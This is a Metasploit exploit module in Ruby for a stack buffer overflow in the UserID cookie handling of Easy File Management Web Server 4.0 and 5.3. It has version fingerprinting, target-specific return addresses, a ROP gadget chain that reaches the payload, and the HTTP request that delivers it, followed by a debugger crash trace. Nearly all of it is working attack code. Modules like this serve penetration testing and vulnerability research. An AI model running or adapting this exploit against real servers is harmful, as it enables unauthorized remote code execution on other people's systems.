##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking # Reliable memory corruption

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Easy File Management Web Server Stack Buffer Overflow',
      'Description'    => %q{
        Easy File Management Web Server v4.0 and v5.3 contains a stack buffer
        overflow condition that is triggered as user-supplied input is not
        properly validated when handling the UserID cookie. This may allow a
        remote attacker to execute arbitrary code.
      },
      'Author'         =>
        [
          'superkojiman',  # Vulnerability discovery
          'Julien Ahrens', # Exploit
          'TecR0c <roccogiovannicalvi[at]gmail.com>' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['OSVDB', '107241'],
          ['EDB',   '33610'],
          ['BID',   '67542'],
          ['URL',   'http://www.cnnvd.org.cn/vulnerability/show/cv_id/2014050536'],
          ['URL',   'http://www.web-file-management.com/']
        ],
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'DefaultOptions' =>
        {
          'EXITFUNC'   => 'process'
        },
      'Payload'        =>
        {
          'BadChars'   => "\x00\x0a\x0d;",
          'Space'      => 3420 # Lets play it safe
        },
      'Targets'        =>
        [
          # Successfully tested efmws.exe (4.0.0.0) / (5.3.0.0) on:
          # -- Microsoft Windows XP [Version 5.1.2600]
          # -- Microsoft Windows    [Version 6.1.7600]
          # -- Microsoft Windows    [Version 6.3.9600]
          ['Automatic Targeting', { 'auto' => true }],
          ['Efmws 5.3 Universal', { 'Esp' => 0xA445ABCF, 'Ret' => 0x10010101 }],
          ['Efmws 4.0 Universal', { 'Esp' => 0xA4518472, 'Ret' => 0x10010101 }],
          # 0x10010101 = pop ebx > pop ecx > retn
          # 0xA445ABCF = 0x514CF5 push esp > retn 0c
          # 0xA4518472 = 0x457452 jmp esp
          # From ImageLoad.dll
        ],
      'DisclosureDate' => 'May 20 2014',
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [true, 'The URI path of an existing resource', '/vfolder.ghp'])
        ], self.class)
  end

  def get_version

    #
    # NOTE: Version 5.3 still reports "4.0" in the "Server" header
    #

    version = nil
    res = send_request_raw({'uri' => '/whatsnew.txt'})
    if res && res.body =~ /What's new in Easy File Management Web Server V(\d\.\d)/
      version = $1
      vprint_status "#{peer} - Found version: #{version}"
    elsif res.headers['server'] =~ /Easy File Management Web Server v(4\.0)/
      version = $1
      vprint_status "#{peer} - Based on Server header: #{version}"
    end

    version
  end

  def check
    code = Exploit::CheckCode::Safe
    version = get_version
    if version.nil?
      code = Exploit::CheckCode::Unknown
    elsif version == "5.3"
      code = Exploit::CheckCode::Appears
    elsif version == "4.0"
      code = Exploit::CheckCode::Appears
    end

    code
  end

  def exploit

    #
    # Get target version to determine how to reach call/jmp esp
    #

    print_status("#{peer} - Fingerprinting version...")
    version = get_version

    if target.name =~ /Automatic/
      if version.nil?
        fail_with(Failure::NoTarget, "#{peer} - Unable to automatically detect a target")
      elsif version =~ /5\.3/
        my_target = targets[1]
      elsif version =~ /4\.0/
        my_target = targets[2]
      end
      print_good("#{peer} - Version #{version} found")
    else
      my_target = target
      unless version && my_target.name.include?(version)
        print_error("#{peer} - The selected target doesn't match the detected version, trying anyway...")
      end
    end

    #
    # Fu to reach where payload lives
    #

    sploit =  rand_text(80)                # Junk
    sploit << [0x1001D8C8].pack("V")       # Push edx
    sploit << rand_text(280)               # Junk
    sploit << [my_target.ret].pack("V")    # Pop ebx > pop ecx > retn
    sploit << [my_target['Esp']].pack("V") # Setup call/jmp esp
    sploit << [0x10010125].pack("V")       # Contains 00000000 to pass the jnz instruction
    sploit << [0x10022AAC].pack("V")       # Mov eax,ebx > pop esi > pop ebx > retn
    sploit << rand_text(8)                 # Filler
    sploit << [0x1001A187].pack("V")       # Add eax,5bffc883 > retn
    sploit << [0x1002466D].pack("V")       # Push eax > retn
    sploit << payload.encoded

    print_status "#{peer} - Trying target #{my_target.name}..."

    #
    # NOTE: Successful HTTP request is required to trigger
    #

    send_request_cgi({
      'uri'    => normalize_uri(target_uri.path),
      'cookie' => "SESSIONID=; UserID=#{sploit}; PassWD=;",
    }, 1)
  end
end

=begin

#
# 0x44f57d This will write UserID up the stack. If the UserID is to large it
# will overwrite a pointer which is used later on at 0x468702
#

eax=000007d1 ebx=00000000 ecx=000001f4 edx=016198ac esi=01668084 edi=016198ac
eip=0044f57d esp=016197e8 ebp=ffffffff iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
fmws+0x4f57d:
0044f57d f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
0:004> dd @esi
01668084  41414141 41414141 41414141 41414141
01668094  41414141 41414141 41414141 41414141
016680a4  41414141 41414141 41414141 41414141
016680b4  41414141 41414141 41414141 41414141
016680c4  41414141 41414141 41414141 41414141
016680d4  41414141 41414141 41414141 41414141
016680e4  41414141 41414141 41414141 41414141
016680f4  41414141 41414141 41414141 41414141

(c38.8cc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=015198fc edx=41414141 esi=015198ec edi=015198fc
eip=00468702 esp=015197c0 ebp=ffffffff iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
fmws+0x68702:
00468702 ff5228          call    dword ptr [edx+28h]  ds:0023:41414169=????????

=end
